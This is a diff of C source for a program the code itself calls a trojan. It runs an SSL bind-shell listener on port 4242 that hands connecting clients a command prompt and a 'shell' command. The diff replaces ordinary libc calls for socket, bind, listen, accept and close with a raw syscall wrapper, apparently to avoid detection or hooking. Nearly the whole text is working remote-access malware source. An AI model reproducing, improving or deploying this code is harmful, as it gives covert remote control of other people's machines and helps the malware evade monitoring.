@@ -1,7 +1,5 @@
 #include "trojan.h"
 
-#define MAX_CLIENTS 3
-
 int active_connections = 0;
 int sig;
 
@@ -13,6 +11,7 @@ int handle_recv(SSL *ssl) {
     char buffer[1024];
     char response[1024];
 
+
     while (1) {
         SSL_write(ssl, "$> ", 3);
         memset(buffer, 0, 1024);
@@ -23,10 +22,8 @@ int handle_recv(SSL *ssl) {
 
         if (!strncmp(buffer, "quit", 4))
             break;
-        if (!strncmp(buffer, "shell", 5)) {
+        if (!strncmp(buffer, "shell", 5))
             handle_shell(ssl);
-        }
-
         format_response(response, "Command not found\n\n");
         SSL_write(ssl, response, strlen(response));
     }
@@ -69,7 +66,7 @@ void *handle_client(void *arg) {
     printf("close connexion\n");
     SSL_shutdown(args->ssl);
     SSL_free(args->ssl);
-    close(args->client_socket);
+    sc(SYS_close, args->client_socket);
     free(args);
     active_connections--;
 
@@ -83,25 +80,24 @@ void start_socket_listener() {
     SSL_CTX *ctx = create_context();
     configure_cert(ctx);
 
-    server_fd = socket(AF_INET, SOCK_STREAM, 0);
-    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    server_fd = sc(SYS_socket, AF_INET, SOCK_STREAM, 0);
+    sc(SYS_setsockopt, server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
 
     address.sin_family = AF_INET;
     address.sin_addr.s_addr = INADDR_ANY;
     address.sin_port = htons(4242);
 
-    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
-    listen(server_fd, MAX_CLIENTS);
+    sc(SYS_bind, server_fd, (struct sockaddr *)&address, sizeof(address));
+    sc(SYS_listen, server_fd, MAX_CLIENTS);
 
     printf("Server listening on port 4242\n");
-
     while (1) {
         t_args *args = calloc(1, sizeof(t_args));
         args->ssl = SSL_new(ctx);
         socklen_t addrlen = sizeof(address);
-        args->client_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
-
+        args->client_socket = sc(SYS_accept ,server_fd, (struct sockaddr *)&address, &addrlen);
         SSL_set_fd(args->ssl, args->client_socket);
+
         printf("New connection attempt...\n");
         if (SSL_accept(args->ssl)) {
             if (active_connections >= MAX_CLIENTS) {
@@ -111,6 +107,7 @@ void start_socket_listener() {
             }
             active_connections++;
             pthread_t thread_id;
+            
             pthread_create(&thread_id, NULL, handle_client, args);
             pthread_detach(thread_id);
         } else {
@@ -118,7 +115,6 @@ void start_socket_listener() {
             ft_shutdown(args);
         }
     }
-
     close(server_fd);
     SSL_CTX_free(ctx);
 }
